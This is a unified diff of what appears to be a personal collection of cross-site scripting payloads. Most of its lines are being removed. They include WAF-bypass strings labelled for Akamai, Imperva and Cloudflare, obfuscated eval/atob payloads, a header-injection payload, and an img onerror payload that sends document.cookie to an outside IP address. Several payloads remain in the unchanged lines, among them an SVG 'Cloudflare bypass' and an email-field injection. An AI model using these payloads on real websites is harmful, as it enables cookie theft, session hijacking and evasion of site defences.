@@ -1,30 +1,4 @@
-"><ScRiPt>alert(document.cookie)</sCrIpT>
-
-"name":"test\"><payloads>"
-
-<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
-
-"><img src=x onerror=alert(document.cookie)>
-
-JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/alert(document.cookie)}//\76-->
-
-"><img/src/onerror=.1|alert`XSS-Found-by-F0XXTR0T` class=d>
-
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#basic-exploitation
-
-<h1><i>Mr Bean: Hey naughty</i></h1><img src="https://www.outsideleft.com/i/stars/stewiekm.jpg" width="400" height="600">
-
-<button onclick="window.location.href='https://www.google.com'">Click me</button>
-
-<img src=x onerror=this.src=‘http://192.168.0.18:8888/?’+document.cookie;>
-
-https://drive.google.com/drive/folders/14zlqgin6rUfr6jQRBCLbbP8P8Vdypz7x
-
-```"><img src=1 onerror=alert(1)> or "><img src=1 onerror=alert(document.cookie)>```
-
-"><A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
-
-**Cloudflared**
+Cloudflared
 
 ‘>alert(154)</script><script/154=’;;;;;;;
 
@@ -43,12 +17,6 @@ touch '"><img src=x onerror=alert("xss!")>.pdf' fileupload
 https://www.geeksforgeeks.org/tag/php-questions/page/7/?type="><img src=1 onerror=alert(1)>.gif
 
 javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
-
-Akamai bypass
-
-';k='e'%0Atop['al'*'k'+'rt'](1)//
-
-Cloudflared bypass
 
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 
@@ -71,47 +39,3 @@ Cloudflared bypass
 For email
 
 a7madn1@gmail.com'\"><svg/onload=alert(/xss/)>
-
-Akamai bypass WAF
-
-1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
-
-"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
-
-Via header injection
-
-X-Forwarded-For: '<svg onload=alert(document.domain)>
-
-“><a href=“#” onmouseleave=alert(99)>click
-
-<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
-
-6'%22()%26%25%22%3E%3Csvg/onload=prompt(document.domain)%3E/
-
-Simple URL encoded Payload
-
-%22%3E%3Cimg%20src=x%20onerror=alert(document.cookies)%3E
-
-'%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.
-
-fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode
-
-(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--
-
-><%2fSCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) <%2fSCRIPT>
-
-<div id="1"><svg><style>&lt;img/src=x onerror=alert(document.domain)// </b>//["'`-->
-
-XSS in Swagger
-
-https://notification.uat.tensai.run//swagger/index.html?configUrl=https://xss.smarpo.com/test.json
-
-This magical bypass payload works on Akamai, Imperva and cloudflare 🔥 🔥 🔥
-
-<A HRef=//site.com AutoFocus %26%2362 OnFocus%0C=import(href)>
-
-testtest”+onmouseover%3D”alert%26%230000000040%3Bdocument[‘cookie’])
-
-Imperva bypass
-
-%22%3EEnter_Mouse_Pointer_Here_to_get_XSS%3C%5K/onpointerenter=alert(location)%3E%3!–
